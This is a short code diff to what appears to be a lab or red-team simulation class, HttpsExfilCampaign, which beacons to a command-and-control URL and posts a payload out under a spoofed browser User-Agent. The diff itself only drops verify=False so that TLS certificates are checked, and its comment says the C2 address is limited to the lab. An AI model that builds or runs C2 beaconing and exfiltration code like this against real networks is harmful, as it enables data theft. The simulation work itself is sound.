@@ -65,7 +65,12 @@ class HttpsExfilCampaign(BaseCampaign):
 
     def _beacon(self) -> dict:
         try:
-            resp = requests.get(self.C2_URL, timeout=3, verify=False)
+            # G3.6: verify=False disabled TLS cert validation entirely, so a
+            # MITM'd or misconfigured C2_URL would connect silently instead
+            # of raising -- drop it. C2_URL is now vetted (runner.py
+            # C2_ENV_VARS) to only ever resolve in-lab or not at all, so
+            # there is no legitimate need to skip cert validation here.
+            resp = requests.get(self.C2_URL, timeout=3)
             return {"status": "connected", "http_status": resp.status_code}
         except Exception:
             return {"status": "simulated", "note": "C2 server not reachable — simulating for lab"}
@@ -87,7 +92,6 @@ class HttpsExfilCampaign(BaseCampaign):
                 data={"data": payload.decode()},
                 headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"},
                 timeout=3,
-                verify=False,
             )
             return {"status": "sent", "bytes": len(payload), "http_status": resp.status_code}
         except Exception:
